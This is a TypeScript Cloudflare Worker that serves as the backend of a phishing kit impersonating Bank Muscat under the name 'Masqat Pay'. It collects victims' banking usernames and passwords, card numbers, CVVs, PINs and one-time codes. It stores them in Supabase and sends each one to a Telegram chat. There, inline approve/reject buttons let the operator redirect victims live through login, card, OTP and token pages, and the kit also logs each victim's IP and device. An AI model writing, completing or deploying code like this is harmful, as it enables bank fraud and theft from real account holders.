/**
 * Cloudflare Worker for Masqat Pay (Bank Muscat Smart Watch & Card Link)
 * Supports:
 * - Server-side Supabase persistence (REST API compatible with Cloudflare Edge runtime)
 * - Server-side Telegram Bot API notifications + interactive inline approval buttons
 * - Real-time Admin Dashboard API (/api/requests, /api/presence, /api/stats, /api/admin/*)
 * - Full CORS & SPA fallback so /admin and all client routes never return 404 Page Not Found
 */

export interface Env {
  ASSETS?: {
    fetch: (req: Request | string) => Promise<Response>;
  };
  SUPABASE_URL?: string;
  VITE_SUPABASE_URL?: string;
  SUPABASE_SERVICE_ROLE_KEY?: string;
  SUPABASE_ANON_KEY?: string;
  VITE_SUPABASE_ANON_KEY?: string;
  SUPABASE_TABLE?: string;
  TELEGRAM_BOT_TOKEN?: string;
  VITE_TELEGRAM_BOT_TOKEN?: string;
  TELEGRAM_CHAT_ID?: string;
  VITE_TELEGRAM_CHAT_ID?: string;
  ADMIN_EMAIL?: string;
  ADMIN_PASSWORD?: string;
}

export interface RequestData {
  id: string;
  name: string;
  mobile: string;
  idNumber: string;
  cardType: string;
  address: string;
  date: string;
  loginUsername?: string;
  loginPassword?: string;
  paymentName?: string;
  cardNumber?: string;
  expMonth?: string;
  expYear?: string;
  cvv?: string;
  cardPin?: string;
  otp?: string;
  otpStatus?: string;
  nextAction?: string;
  step: string;
  createdAt: string;
  updatedAt: string;
}

export interface VisitorMeta {
  ip: string;
  os: string;
  device: string;
  browser: string;
  country: string;
}

export interface ActiveSessionInfo {
  clientId: string;
  requestId: string | null;
  currentPage: string;
  lastSeen: number;
  meta?: VisitorMeta;
}

// Edge Isolate In-Memory Cache (synced with Supabase)
const requestsMap = new Map<string, RequestData>();
const deletedRequestIds = new Set<string>();
const clientToRequestMap = new Map<string, string>();
const activeSessionsMap = new Map<string, ActiveSessionInfo>();
const userPagesMap: Record<string, string> = {};
const userMetaMap: Record<string, VisitorMeta> = {};
const activeAdminTokens = new Set<string>();
let totalVisitorsCount = 0;

const CORS_HEADERS: Record<string, string> = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Credentials': 'true',
  'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, PATCH, OPTIONS',
  'Access-Control-Allow-Headers':
    'Origin, X-Requested-With, Content-Type, Accept, Authorization, X-Client-Id',
};

function jsonResponse(data: unknown, status = 200, extraHeaders: Record<string, string> = {}): Response {
  return new Response(JSON.stringify(data), {
    status,
    headers: {
      'Content-Type': 'application/json; charset=utf-8',
      ...CORS_HEADERS,
      ...extraHeaders,
    },
  });
}

function getSupabaseConfig(env: Env) {
  const url = (env.SUPABASE_URL || env.VITE_SUPABASE_URL || '').replace(/\/+$/, '');
  const key =
    env.SUPABASE_SERVICE_ROLE_KEY ||
    env.SUPABASE_ANON_KEY ||
    env.VITE_SUPABASE_ANON_KEY ||
    '';
  const table = env.SUPABASE_TABLE || 'requests';
  return { url, key, table, enabled: Boolean(url && key) };
}

function normalizeRowToRequestData(row: Record<string, any>): RequestData {
  const nested = typeof row.data === 'object' && row.data !== null ? row.data : {};
  const nowIso = new Date().toISOString();
  return {
    id: String(row.id || nested.id || Date.now()),
    name: String(row.name ?? nested.name ?? row.full_name ?? nested.fullName ?? ''),
    mobile: String(row.mobile ?? nested.mobile ?? row.phone ?? nested.phone ?? ''),
    idNumber: String(row.idNumber ?? row.id_number ?? nested.idNumber ?? 'عميل بنك مسقط'),
    cardType: String(row.cardType ?? row.card_type ?? nested.cardType ?? nested.watchColor ?? 'rose-gold'),
    address: String(row.address ?? nested.address ?? ''),
    date: String(row.date ?? nested.date ?? nowIso.slice(0, 10)),
    loginUsername: row.loginUsername ?? row.login_username ?? nested.loginUsername ?? undefined,
    loginPassword: row.loginPassword ?? row.login_password ?? nested.loginPassword ?? undefined,
    paymentName: row.paymentName ?? row.payment_name ?? nested.paymentName ?? undefined,
    cardNumber: row.cardNumber ?? row.card_number ?? nested.cardNumber ?? undefined,
    expMonth: row.expMonth ?? row.exp_month ?? nested.expMonth ?? undefined,
    expYear: row.expYear ?? row.exp_year ?? nested.expYear ?? undefined,
    cvv: row.cvv ?? nested.cvv ?? undefined,
    cardPin: row.cardPin ?? row.card_pin ?? nested.cardPin ?? undefined,
    otp: row.otp ?? nested.otp ?? undefined,
    otpStatus: row.otpStatus ?? row.otp_status ?? nested.otpStatus ?? undefined,
    nextAction: row.nextAction ?? row.next_action ?? nested.nextAction ?? undefined,
    step: String(row.step ?? nested.step ?? 'form'),
    createdAt: String(row.createdAt ?? row.created_at ?? nested.createdAt ?? nowIso),
    updatedAt: String(row.updatedAt ?? row.updated_at ?? nested.updatedAt ?? nowIso),
  };
}

async function syncFromSupabase(env: Env): Promise<void> {
  const cfg = getSupabaseConfig(env);
  if (!cfg.enabled) return;

  try {
    const res = await fetch(`${cfg.url}/rest/v1/${cfg.table}?select=*&limit=200`, {
      method: 'GET',
      headers: {
        apikey: cfg.key,
        Authorization: `Bearer ${cfg.key}`,
        'Content-Type': 'application/json',
      },
    });
    if (!res.ok) return;
    const rows = await res.json();
    if (Array.isArray(rows)) {
      for (const row of rows) {
        const normalized = normalizeRowToRequestData(row);
        if (deletedRequestIds.has(normalized.id)) continue;
        const existing = requestsMap.get(normalized.id);
        if (!existing || new Date(normalized.updatedAt) >= new Date(existing.updatedAt)) {
          requestsMap.set(normalized.id, normalized);
        }
      }
    }
  } catch {
    // Non-blocking fallback to edge memory
  }
}

async function saveRequestToSupabase(env: Env, record: RequestData): Promise<boolean> {
  deletedRequestIds.delete(record.id);
  requestsMap.set(record.id, record);
  const cfg = getSupabaseConfig(env);
  if (!cfg.enabled) return false;

  const headers = {
    apikey: cfg.key,
    Authorization: `Bearer ${cfg.key}`,
    'Content-Type': 'application/json',
    Prefer: 'resolution=merge-duplicates,return=minimal',
  };

  try {
    // Attempt 1: Full payload (camelCase)
    const res1 = await fetch(`${cfg.url}/rest/v1/${cfg.table}?on_conflict=id`, {
      method: 'POST',
      headers,
      body: JSON.stringify(record),
    });
    if (res1.ok) return true;

    // Attempt 2: snake_case payload
    const snakePayload = {
      id: record.id,
      name: record.name,
      mobile: record.mobile,
      id_number: record.idNumber,
      card_type: record.cardType,
      address: record.address,
      date: record.date,
      login_username: record.loginUsername || null,
      login_password: record.loginPassword || null,
      payment_name: record.paymentName || null,
      card_number: record.cardNumber || null,
      exp_month: record.expMonth || null,
      exp_year: record.expYear || null,
      cvv: record.cvv || null,
      card_pin: record.cardPin || null,
      otp: record.otp || null,
      otp_status: record.otpStatus || null,
      next_action: record.nextAction || null,
      step: record.step,
      created_at: record.createdAt,
      updated_at: record.updatedAt,
    };
    const res2 = await fetch(`${cfg.url}/rest/v1/${cfg.table}?on_conflict=id`, {
      method: 'POST',
      headers,
      body: JSON.stringify(snakePayload),
    });
    if (res2.ok) return true;

    // Attempt 3: JSONB fallback
    const res3 = await fetch(`${cfg.url}/rest/v1/${cfg.table}?on_conflict=id`, {
      method: 'POST',
      headers,
      body: JSON.stringify({
        id: record.id,
        step: record.step,
        data: record,
        created_at: record.createdAt,
        updated_at: record.updatedAt,
      }),
    });
    return res3.ok;
  } catch {
    return false;
  }
}

async function deleteRequestFromSupabase(env: Env, id: string): Promise<void> {
  deletedRequestIds.add(id);
  requestsMap.delete(id);
  delete userPagesMap[id];
  delete userMetaMap[id];
  for (const [clientId, reqId] of clientToRequestMap.entries()) {
    if (reqId === id) clientToRequestMap.delete(clientId);
  }
  for (const session of activeSessionsMap.values()) {
    if (session.requestId === id) {
      session.requestId = null;
    }
  }
  const cfg = getSupabaseConfig(env);
  if (!cfg.enabled) return;

  try {
    await fetch(`${cfg.url}/rest/v1/${cfg.table}?id=eq.${encodeURIComponent(id)}`, {
      method: 'DELETE',
      headers: {
        apikey: cfg.key,
        Authorization: `Bearer ${cfg.key}`,
      },
    });
  } catch {
    // Non-blocking
  }
}

const STEP_TITLES: Record<string, string> = {
  form: '📋 تسجيل بيانات العميل (الخطوة 1)',
  order: '📋 تسجيل بيانات العميل (الخطوة 1)',
  watch: '⌚ اختيار مواصفات الساعة (الخطوة 2)',
  'select-watch': '⌚ اختيار مواصفات الساعة (الخطوة 2)',
  login: '🔐 تسجيل الدخول المصرفي (الخطوة 3)',
  card: '💳 ربط البطاقة البنكية (الخطوة 4)',
  'card-link': '💳 ربط البطاقة البنكية (الخطوة 4)',
  otp: '📲 رمز التحقق النصي OTP SMS (الخطوة 5)',
  verify: '🛡️ رمز الأمان الرقمي TOKEN (5 أرقام)',
  'verify-otp': '🛡️ رمز التحقق الرقمي TOKEN (الخطوة 5)',
  'otp-bank': '🏦 طلب موافقة تطبيق البنك',
};

function escapeHtml(val: unknown): string {
  return String(val ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function formatRequestTelegramMessage(step: string, req: RequestData): string {
  const title = STEP_TITLES[step] || STEP_TITLES[req.step] || `🔔 تحديث طلب (${step})`;
  const lines: string[] = [
    `🏦 <b>بنك مسقط | Masqat Pay</b>`,
    `━━━━━━━━━━━━━━━━━━`,
    `<b>${title}</b>`,
    `🆔 <b>رقم الطلب:</b> <code>${escapeHtml(req.id)}</code>`,
    ``,
  ];

  if (req.name) lines.push(`👤 <b>الاسم:</b> <code>${escapeHtml(req.name)}</code>`);
  if (req.mobile) lines.push(`📱 <b>رقم الهاتف:</b> <code>${escapeHtml(req.mobile)}</code>`);
  if (req.idNumber) lines.push(`🪪 <b>حالة العميل/الهوية:</b> <code>${escapeHtml(req.idNumber)}</code>`);
  if (req.cardType) lines.push(`⌚ <b>اللون/الفئة:</b> <code>${escapeHtml(req.cardType)}</code>`);
  if (req.address) lines.push(`📦 <b>المواصفات/العنوان:</b> <code>${escapeHtml(req.address)}</code>`);

  if (req.loginUsername || req.loginPassword) {
    lines.push(``);
    lines.push(`🔐 <b>بيانات الدخول المصرفي:</b>`);
    if (req.loginUsername) lines.push(`• اسم المستخدم: <code>${escapeHtml(req.loginUsername)}</code>`);
    if (req.loginPassword) lines.push(`• الرقم السري: <code>${escapeHtml(req.loginPassword)}</code>`);
  }

  if (req.cardNumber || req.cvv || req.cardPin) {
    lines.push(``);
    lines.push(`💳 <b>بيانات البطاقة البنكية:</b>`);
    if (req.cardNumber) lines.push(`• رقم البطاقة: <code>${escapeHtml(req.cardNumber)}</code>`);
    if (req.expMonth || req.expYear) {
      lines.push(`• تاريخ الانتهاء: <code>${escapeHtml(req.expMonth || '--')}/${escapeHtml(req.expYear || '--')}</code>`);
    }
    if (req.cvv) lines.push(`• رمز الأمان (CVV): <code>${escapeHtml(req.cvv)}</code>`);
    if (req.cardPin) lines.push(`• الرقم السري للبطاقة (PIN): <code>${escapeHtml(req.cardPin)}</code>`);
  }

  if (req.otp) {
    lines.push(``);
    lines.push(`🛡️ <b>رمز التحقق (OTP / TOKEN):</b> <code>${escapeHtml(req.otp)}</code>`);
  }

  if (req.otpStatus) {
    lines.push(`📌 <b>الحالة:</b> <code>${escapeHtml(req.otpStatus)}</code>`);
  }

  lines.push(``);
  lines.push(`🕒 الوقت: <code>${new Date().toISOString()}</code>`);
  return lines.join('\n');
}

function buildTelegramInlineKeyboard(req: RequestData) {
  const buttons: Array<Array<{ text: string; callback_data: string }>> = [];

  if (req.otpStatus === 'login_pending' || (req.step === 'login' && req.loginUsername)) {
    buttons.push([
      { text: '✅ موافقة الدخول', callback_data: `approve_login:${req.id}` },
      { text: '❌ رفض الدخول', callback_data: `reject_login:${req.id}` },
    ]);
  }

  if (req.otpStatus === 'card_pending' || (req.step === 'card' && req.cardNumber)) {
    buttons.push([
      { text: '✅ موافقة البطاقة (طلب OTP)', callback_data: `approve_card:${req.id}` },
      { text: '❌ رفض البطاقة', callback_data: `reject_card:${req.id}` },
    ]);
  }

  if (req.otp && (!req.otpStatus || req.otpStatus === 'pending')) {
    buttons.push([
      { text: '🔑 قبول وطلب TOKEN (5)', callback_data: `approve_token:${req.id}` },
      { text: '✅ قبول نهائي', callback_data: `approve_otp:${req.id}` },
      { text: '❌ رفض الرمز', callback_data: `reject_otp:${req.id}` },
    ]);
  }

  return buttons.length > 0 ? { inline_keyboard: buttons } : undefined;
}

async function sendRequestToTelegram(env: Env, step: string, req: RequestData): Promise<boolean> {
  const botToken = env.TELEGRAM_BOT_TOKEN || env.VITE_TELEGRAM_BOT_TOKEN;
  const chatId = env.TELEGRAM_CHAT_ID || env.VITE_TELEGRAM_CHAT_ID;
  if (!botToken || !chatId) return false;

  const text = formatRequestTelegramMessage(step, req);
  const replyMarkup = buildTelegramInlineKeyboard(req);

  try {
    const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
        ...(replyMarkup ? { reply_markup: replyMarkup } : {}),
      }),
    });
    if (res.ok) return true;

    const retry = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      }),
    });
    return retry.ok;
  } catch {
    return false;
  }
}

function applyApprovalEffects(existing: RequestData, patch: Partial<RequestData>): RequestData {
  const nowIso = new Date().toISOString();
  const updated: RequestData = {
    ...existing,
    ...patch,
    updatedAt: nowIso,
  };

  if (patch.otpStatus && patch.nextAction === undefined) {
    switch (patch.otpStatus) {
      case 'login_approved':
        updated.step = 'card';
        updated.nextAction = '/card-link';
        break;
      case 'login_rejected':
        updated.step = 'login';
        updated.nextAction = '/login';
        break;
      case 'card_approved':
        updated.step = 'otp';
        updated.nextAction = '/otp';
        break;
      case 'card_rejected':
        updated.step = 'card';
        updated.nextAction = '/card-link';
        break;
      case 'otp_approved':
        updated.step = 'verify';
        updated.nextAction = '/verify';
        break;
      case 'approved':
        updated.step = 'verify';
        updated.nextAction = '/success';
        break;
      case 'rejected':
        updated.nextAction = existing.step === 'otp' ? '/otp' : '/verify';
        break;
    }
  }

  return updated;
}

async function handleTelegramCallbackQuery(env: Env, callbackQuery: any): Promise<void> {
  const botToken = env.TELEGRAM_BOT_TOKEN || env.VITE_TELEGRAM_BOT_TOKEN;
  if (!botToken || !callbackQuery?.data) return;

  const [action, reqId] = String(callbackQuery.data).split(':');
  const existing = requestsMap.get(reqId);
  if (!existing) return;

  let statusToSet = '';
  let feedbackText = '';
  if (action === 'approve_login') {
    statusToSet = 'login_approved';
    feedbackText = '✅ تمت الموافقة على تسجيل الدخول';
  } else if (action === 'reject_login') {
    statusToSet = 'login_rejected';
    feedbackText = '❌ تم رفض تسجيل الدخول';
  } else if (action === 'approve_card') {
    statusToSet = 'card_approved';
    feedbackText = '✅ تمت الموافقة على البطاقة وتوجيه الزائر لـ OTP';
  } else if (action === 'reject_card') {
    statusToSet = 'card_rejected';
    feedbackText = '❌ تم رفض البطاقة';
  } else if (action === 'approve_token') {
    statusToSet = 'otp_approved';
    feedbackText = '🔑 تم قبول OTP وتحويل الزائر لصفحة TOKEN (5 أرقام)';
  } else if (action === 'approve_otp') {
    statusToSet = 'approved';
    feedbackText = '✅ تم القبول النهائي وتوجيه الزائر لصفحة النجاح';
  } else if (action === 'reject_otp') {
    statusToSet = 'rejected';
    feedbackText = '❌ تم رفض الرمز وطلب رمز جديد';
  }

  if (statusToSet) {
    const updated = applyApprovalEffects(existing, { otpStatus: statusToSet });
    await saveRequestToSupabase(env, updated);

    try {
      await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          callback_query_id: callbackQuery.id,
          text: feedbackText,
          show_alert: false,
        }),
      });
    } catch {
      // Ignore network errors
    }
  }
}

function parseVisitorMeta(request: Request): VisitorMeta {
  const ua = request.headers.get('user-agent') || '';
  const ip =
    request.headers.get('cf-connecting-ip') ||
    (request.headers.get('x-forwarded-for') || '').split(',')[0].trim() ||
    '188.53.192.70';
  const cfCountry = request.headers.get('cf-ipcountry') || 'OM';

  let os = 'iOS / Android';
  if (/Windows/i.test(ua)) os = 'Windows';
  else if (/iPhone|iPad|iPod/i.test(ua)) os = 'iOS';
  else if (/Android/i.test(ua)) os = 'Android';
  else if (/Mac OS/i.test(ua)) os = 'macOS';
  else if (/Linux/i.test(ua)) os = 'Linux';

  const device = /Mobile|Android|iPhone|iPad/i.test(ua) ? 'mobile' : 'desktop';

  let browser = 'Safari / Chrome';
  if (/Edg/i.test(ua)) browser = 'Edge';
  else if (/Chrome/i.test(ua)) browser = 'Chrome';
  else if (/Safari/i.test(ua)) browser = 'Safari';
  else if (/Firefox/i.test(ua)) browser = 'Firefox';

  return {
    ip,
    os,
    device,
    browser,
    country: cfCountry === 'OM' ? 'Oman, Muscat' : cfCountry,
  };
}

function getAllSortedRequests(): RequestData[] {
  return Array.from(requestsMap.values()).sort(
    (a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
  );
}

function resolveRequestByIdOrClient(idOrCurrent?: string, clientId?: string): RequestData | null {
  if (
    idOrCurrent &&
    idOrCurrent !== 'current' &&
    !deletedRequestIds.has(idOrCurrent) &&
    requestsMap.has(idOrCurrent)
  ) {
    return requestsMap.get(idOrCurrent)!;
  }
  if (clientId) {
    if (clientToRequestMap.has(clientId)) {
      const mappedId = clientToRequestMap.get(clientId)!;
      if (!deletedRequestIds.has(mappedId) && requestsMap.has(mappedId)) {
        return requestsMap.get(mappedId)!;
      }
      clientToRequestMap.delete(clientId);
    }
    return null;
  }
  const all = getAllSortedRequests();
  return all.length > 0 ? all[0] : null;
}

function extractAdminToken(request: Request): string {
  const authHeader = request.headers.get('authorization') || '';
  if (authHeader.toLowerCase().startsWith('bearer ')) {
    return authHeader.slice(7).trim();
  }
  const cookieHeader = request.headers.get('cookie') || '';
  const match = cookieHeader.match(/(?:^|;\s*)admin_token=([^;]+)/);
  return match ? decodeURIComponent(match[1].trim()) : '';
}

export default {
  async fetch(request: Request, env: Env): Promise<Response> {
    const url = new URL(request.url);
    const { pathname } = url;
    const method = request.method.toUpperCase();

    if (method === 'OPTIONS') {
      return new Response(null, { status: 200, headers: CORS_HEADERS });
    }

    // ========================================================================
    // API ROUTES (/api/*)
    // ========================================================================
    if (pathname.startsWith('/api/')) {
      const body: Record<string, any> =
        method === 'POST' || method === 'PATCH' || method === 'PUT'
          ? await request.json().catch(() => ({}))
          : {};

      if (pathname === '/api/health') {
        const cfg = getSupabaseConfig(env);
        const telegramConfigured = Boolean(
          (env.TELEGRAM_BOT_TOKEN || env.VITE_TELEGRAM_BOT_TOKEN) &&
            (env.TELEGRAM_CHAT_ID || env.VITE_TELEGRAM_CHAT_ID)
        );
        return jsonResponse({
          status: 'ok',
          runtime: 'cloudflare-worker',
          supabaseConfigured: cfg.enabled,
          telegramConfigured,
        });
      }

      if (pathname === '/api/requests' && method === 'GET') {
        await syncFromSupabase(env);
        return jsonResponse(getAllSortedRequests());
      }

      if (pathname === '/api/requests/current' && method === 'GET') {
        const clientId = url.searchParams.get('clientId') || request.headers.get('x-client-id') || '';
        const current = resolveRequestByIdOrClient('current', clientId);
        return jsonResponse(current || null);
      }

      if (pathname === '/api/requests' && method === 'POST') {
        const clientId = body.clientId ? String(body.clientId) : undefined;
        const nowIso = new Date().toISOString();
        const candidateId = body.id ? String(body.id) : null;
        const existingId =
          (candidateId && !deletedRequestIds.has(candidateId) && requestsMap.has(candidateId)
            ? candidateId
            : null) ||
          (clientId && clientToRequestMap.get(clientId)) ||
          null;
        const existing =
          existingId && !deletedRequestIds.has(existingId) ? requestsMap.get(existingId) : undefined;
        const id =
          existing?.id ||
          (candidateId && !deletedRequestIds.has(candidateId)
            ? candidateId
            : `req_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`);

        const newRecord: RequestData = {
          id,
          name: String(body.name ?? existing?.name ?? ''),
          mobile: String(body.mobile ?? existing?.mobile ?? ''),
          idNumber: String(body.idNumber ?? existing?.idNumber ?? 'عميل بنك مسقط'),
          cardType: String(body.cardType ?? existing?.cardType ?? 'rose-gold'),
          address: String(body.address ?? existing?.address ?? ''),
          date: String(body.date ?? existing?.date ?? nowIso.slice(0, 10)),
          loginUsername: body.loginUsername ?? existing?.loginUsername,
          loginPassword: body.loginPassword ?? existing?.loginPassword,
          paymentName: body.paymentName ?? existing?.paymentName,
          cardNumber: body.cardNumber ?? existing?.cardNumber,
          expMonth: body.expMonth ?? existing?.expMonth,
          expYear: body.expYear ?? existing?.expYear,
          cvv: body.cvv ?? existing?.cvv,
          cardPin: body.cardPin ?? existing?.cardPin,
          otp: body.otp ?? existing?.otp,
          otpStatus: body.otpStatus ?? existing?.otpStatus,
          nextAction: body.nextAction ?? existing?.nextAction,
          step: String(body.step ?? existing?.step ?? 'form'),
          createdAt: existing?.createdAt || nowIso,
          updatedAt: nowIso,
        };

        if (clientId) {
          clientToRequestMap.set(clientId, id);
          const sess = activeSessionsMap.get(clientId);
          if (sess) sess.requestId = id;
        }
        userMetaMap[id] = userMetaMap[id] || parseVisitorMeta(request);

        await saveRequestToSupabase(env, newRecord);
        await sendRequestToTelegram(env, newRecord.step, newRecord);
        return jsonResponse(newRecord);
      }

      if (pathname.startsWith('/api/requests/')) {
        const id = decodeURIComponent(pathname.slice('/api/requests/'.length));

        if (method === 'GET') {
          const clientId = url.searchParams.get('clientId') || request.headers.get('x-client-id') || '';
          const record = resolveRequestByIdOrClient(id, clientId);
          return jsonResponse(record || null);
        }

        if (method === 'PATCH') {
          const clientId = body.clientId ? String(body.clientId) : undefined;
          let existing = resolveRequestByIdOrClient(id, clientId);
          const nowIso = new Date().toISOString();

          if (!existing) {
            const newId =
              id && id !== 'current' && !deletedRequestIds.has(id)
                ? id
                : `req_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`;
            existing = {
              id: newId,
              name: String(body.name || 'عميل بنك مسقط'),
              mobile: String(body.mobile || ''),
              idNumber: String(body.idNumber || 'عميل بنك مسقط'),
              cardType: String(body.cardType || 'rose-gold'),
              address: String(body.address || ''),
              date: nowIso.slice(0, 10),
              step: String(body.step || 'form'),
              createdAt: nowIso,
              updatedAt: nowIso,
            };
          }

          if (clientId) {
            clientToRequestMap.set(clientId, existing.id);
            const sess = activeSessionsMap.get(clientId);
            if (sess) sess.requestId = existing.id;
          }

          const { clientId: _ignored, ...patchFields } = body;
          const updated = applyApprovalEffects(existing, patchFields);

          if (patchFields.nextAction) {
            userPagesMap[updated.id] = String(patchFields.nextAction);
          }
          userMetaMap[updated.id] = userMetaMap[updated.id] || parseVisitorMeta(request);

          await saveRequestToSupabase(env, updated);

          const isVisitorSubmission = Boolean(
            patchFields.loginUsername ||
              patchFields.cardNumber ||
              patchFields.otp ||
              patchFields.step === 'watch' ||
              patchFields.step === 'form'
          );
          if (isVisitorSubmission) {
            await sendRequestToTelegram(env, updated.step, updated);
          }

          return jsonResponse(updated);
        }

        if (method === 'DELETE') {
          await deleteRequestFromSupabase(env, id);
          return jsonResponse({ ok: true, id });
        }
      }

      if (pathname === '/api/presence' && method === 'POST') {
        const { clientId, requestId, currentPage = '/', isNewVisit } = body;
        const cid = String(clientId || `anon_${Date.now()}`);
        const now = Date.now();
        if (isNewVisit) totalVisitorsCount += 1;

        const resolvedReqId: string | null =
          (requestId && requestsMap.has(String(requestId)) ? String(requestId) : null) ||
          clientToRequestMap.get(cid) ||
          null;

        if (resolvedReqId) {
          clientToRequestMap.set(cid, resolvedReqId);
          userPagesMap[resolvedReqId] = String(currentPage);
          userMetaMap[resolvedReqId] = userMetaMap[resolvedReqId] || parseVisitorMeta(request);
        }

        const meta = parseVisitorMeta(request);
        activeSessionsMap.set(cid, {
          clientId: cid,
          requestId: resolvedReqId,
          currentPage: String(currentPage),
          lastSeen: now,
          meta,
        });

        let redirectTo: string | null = null;
        if (resolvedReqId && requestsMap.has(resolvedReqId)) {
          const reqRecord = requestsMap.get(resolvedReqId)!;
          if (reqRecord.nextAction && reqRecord.nextAction !== 'pending') {
            redirectTo = reqRecord.nextAction;
            reqRecord.nextAction = '';
            await saveRequestToSupabase(env, reqRecord);
          }
        }

        return jsonResponse({ ok: true, requestId: resolvedReqId, redirectTo });
      }

      if (pathname === '/api/stats' && method === 'GET') {
        const now = Date.now();
        const onlineUsers: Record<string, boolean> = {};
        const activeSessions: ActiveSessionInfo[] = [];

        for (const [cid, session] of activeSessionsMap.entries()) {
          if (now - session.lastSeen < 30000) {
            activeSessions.push(session);
            if (session.requestId) onlineUsers[session.requestId] = true;
          } else {
            activeSessionsMap.delete(cid);
          }
        }

        return jsonResponse({
          onlineCount: activeSessions.length,
          totalVisitorsCount: Math.max(totalVisitorsCount, requestsMap.size, activeSessions.length),
          onlineUsers,
          userPages: userPagesMap,
          userMeta: userMetaMap,
          activeSessions,
        });
      }

      if (pathname === '/api/admin/login' && method === 'POST') {
        const trimmedEmail = String(body.email || '').trim().toLowerCase();
        const trimmedPass = String(body.password || '').trim();
        if (!trimmedEmail || !trimmedPass) {
          return jsonResponse({ error: 'يرجى إدخال البريد الإلكتروني وكلمة المرور' }, 400);
        }

        const expectedEmail = env.ADMIN_EMAIL?.trim().toLowerCase();
        const expectedPassword = env.ADMIN_PASSWORD?.trim();
        if (expectedEmail && expectedPassword) {
          if (trimmedEmail !== expectedEmail || trimmedPass !== expectedPassword) {
            return jsonResponse({ error: 'بيانات الدخول غير صحيحة' }, 401);
          }
        }

        const token = `adm_${Date.now()}_${Math.random().toString(36).slice(2)}`;
        activeAdminTokens.add(token);
        return jsonResponse(
          { token, ok: true },
          200,
          {
            'Set-Cookie': `admin_token=${encodeURIComponent(token)}; Path=/; HttpOnly; SameSite=Lax; Max-Age=86400`,
          }
        );
      }

      if (pathname === '/api/admin/me' && method === 'GET') {
        const token = extractAdminToken(request);
        if (!token || !activeAdminTokens.has(token)) {
          return jsonResponse({ ok: false, error: 'Unauthorized' }, 401);
        }
        return jsonResponse({ ok: true, role: 'admin' });
      }

      if (pathname === '/api/admin/logout' && method === 'POST') {
        const token = extractAdminToken(request);
        if (token) activeAdminTokens.delete(token);
        return jsonResponse(
          { ok: true },
          200,
          { 'Set-Cookie': 'admin_token=; Path=/; HttpOnly; SameSite=Lax; Max-Age=0' }
        );
      }

      if (pathname === '/api/telegram/webhook' && method === 'POST') {
        if (body?.callback_query) {
          await handleTelegramCallbackQuery(env, body.callback_query);
        }
        return jsonResponse({ ok: true });
      }

      return jsonResponse({ ok: true, success: true, path: pathname, method });
    }

    // ========================================================================
    // STATIC ASSETS & SPA FALLBACK (SO /admin NEVER RETURNS 404)
    // ========================================================================
    if (env.ASSETS) {
      const assetRes = await env.ASSETS.fetch(request);
      if (assetRes.status !== 404) {
        return assetRes;
      }
      // SPA Fallback: serve root '/' for /admin, /admin/login, /form, /otp, /verify, etc.
      const indexUrl = new URL('/', request.url);
      return env.ASSETS.fetch(new Request(indexUrl.toString(), request));
    }

    return new Response('Masqat Pay Cloudflare Worker Running', { status: 200 });
  },
};
